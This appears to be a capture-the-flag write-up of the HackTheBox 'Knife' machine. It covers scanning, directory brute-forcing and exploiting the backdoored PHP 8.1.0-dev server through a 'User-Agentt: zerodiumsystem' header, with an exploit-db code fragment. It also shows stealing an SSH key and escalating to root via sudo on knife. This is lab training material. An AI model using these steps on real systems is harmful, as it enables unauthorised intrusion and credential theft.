![](0.profile_pic.png?raw=true)

#### 1. nmap:
--------

Port:

22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))

```
$ nmap $IP -sV -A -vv

                x --- snip --- x

Not shown: 998 closed ports
Reason: 998 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCjEtN3+WZzlvu54zya9Q+D0d/jwjZT2jYFKwHe0icY7plEWSAqbP+b3ijRL6kv522KEJPHkfXuRwzt5z4CNpyUnqr6nQINn8DU0Iu/UQby+6OiQIleNUCYYaI+1mV0sm4kgmue4oVI1Q3JYOH41efTbGDFHiGSTY1lH3HcAvOFh75dCID0564T078p7ZEIoKRt1l7Yz+GeMZ870Nw13ao0QLPmq2HnpQS34K45zU0lmxIHqiK/IpFJOLfugiQF52Qt6+gX3FOjPgxk8rk81DEwicTrlir2gJiizAOchNPZjbDCnG2UqTapOm292Xg0hCE6H03Ri6GtYs5xVFw/KfGSGb7OJT1jhitbpUxRbyvP+pFy4/8u6Ty91s98bXrCyaEy2lyZh5hm7MN2yRsX+UbrSo98UfMbHkKnePg7/oBhGOOrUb77/DPePGeBF5AT029Xbz90v2iEFfPdcWj8SP/p2Fsn/qdutNQ7cRnNvBVXbNm0CpiNfoHBCBDJ1LR8p8k=
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGKC3ouVMPI/5R2Fsr5b0uUQGDrAa6ev8uKKp5x8wdqPXvM1tr4u0GchbVoTX5T/PfJFi9UpeDx/uokU3chqcFc=
|   256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJbkxEqMn++HZ2uEvM0lDZy+TB8B8IAeWRBEu3a34YIb
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
```

#### 2. Went to corresonding [ip] website, to see what we can find...
--------------------

Found nothing...

Now I was going to run ***gobuster***, but what we can narrow down directory bruteforcing by knowing, exactly what specific extension the webserver actually supports.

##### Two ways:

1. 
![](1.find_supported_server_extension.png?raw=true)

2.

https://user-images.githubusercontent.com/61424547/131264327-759221c8-e833-442c-b262-641bc48c44e7.mp4

So, now we can use this _php extension_ in gobuster bruteforcing command

#### 3. gobuster:
-----------
```
gobuster dir -u http://10.10.10.242:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
```

It only gave one output file named: `index.php`

I got nothing juicy, except the supported extension of the webserver.


#### 4. I then, went to burp suit to capture request
----------

Lets send the captured request to the repeater.

![](3.capturing_request.png?raw=true)

Lets send the request to inspector, shall we ?

![](4.sending_request_to_inspector.png?raw=true)

Now, We can see: ***X-Powered-By: PHP/8.1.0-dev*** in reponse.

I googled it and came up with this blog post: [PHP verion 8.1.0-dev](https://flast101.github.io/php-8.1.0-dev-backdoor-rce/)

![](5.PHP_verion_8.1.0-dev.png?raw=true)

So, We can probably set the **User-Agentt** header like this:

![](6.adding_User-Agentt_header.png?raw=true)

But what should we pass? let's see..

In the above link named _PHP_version_8.1.0-dev_, there is a image:

![](https://flast101.github.io/php-8.1.0-dev-backdoor-rce/php-repo.png?raw=true)

To abuse this vulnerability, We can see that, we have to input: `zerodium` along wih `linux command` to perform _OS command injection_

Let's see:

![](7.zerdium_code_test.png?raw=true)

We can see, it worked 😎!! So now lets, use a bash reverse shell...

![](8.zerodium_initial_shell.png?raw=true)

BTW, if you want to see the full theory behind it, visit: ["zerodium"](https://arstechnica.com/gadgets/2021/03/hackers-backdoor-php-source-code-after-breaching-internal-git-server/) and to see the exploitdb exploit, visit: [exploitdb](https://www.exploit-db.com/exploits/49933)

Here, in exploitdb exploit code:
```python
headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "User-Agentt": "zerodiumsystem('" + cmd + "');"
            }
response = request.get(host, headers = headers, allow_redirects = False)
```

This would do nothing but add another header to the requests named,_`User-Agentt: zerodiumsystem('" + cmd + "');`_ which would help us to perform _OS command injection_

Oh!, one thing if you want to get a stable shell, you can login to this machine via _ssh_ as ssh was running...
**Firstly**, you can copy the ssh key (id_rsa) from .ssh directory and paste it in your local attacker machine within a file.
**Secondly**, modify the file permission, `chmod 600 <filename>`
**Thirdly**, `ssh -i <filename> james@<ip>` - to automatically login to the victim machine as _james_ user.
If this requires any password, do this: `mv id_rsa.pub key authorized_keys` this make the key authorized and usable. Now repeat the all three steps.



So, now we get the _user_flag_

![](9.user_flag.png?raw=true)

Now, for _priv_esc_, let us 1st check this:
```
james@knife:~$ sudo -l
sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```
We can now use, [GTFOBins](https://gtfobins.github.io/) to get _priv_esc_ command:

![](10.root_flag.png?raw=true)

So, now we got the root flag...

This is it for now, if you have any queries, suggestions (tbh, I'm open to all type of comments), please contact me here:
- [linkedin](https://www.linkedin.com/in/soumyanil-biswas/)
- [twitter](https://twitter.com/reveng007)

Meet, all of you in the next blog, until then, Bye 👋..!!!

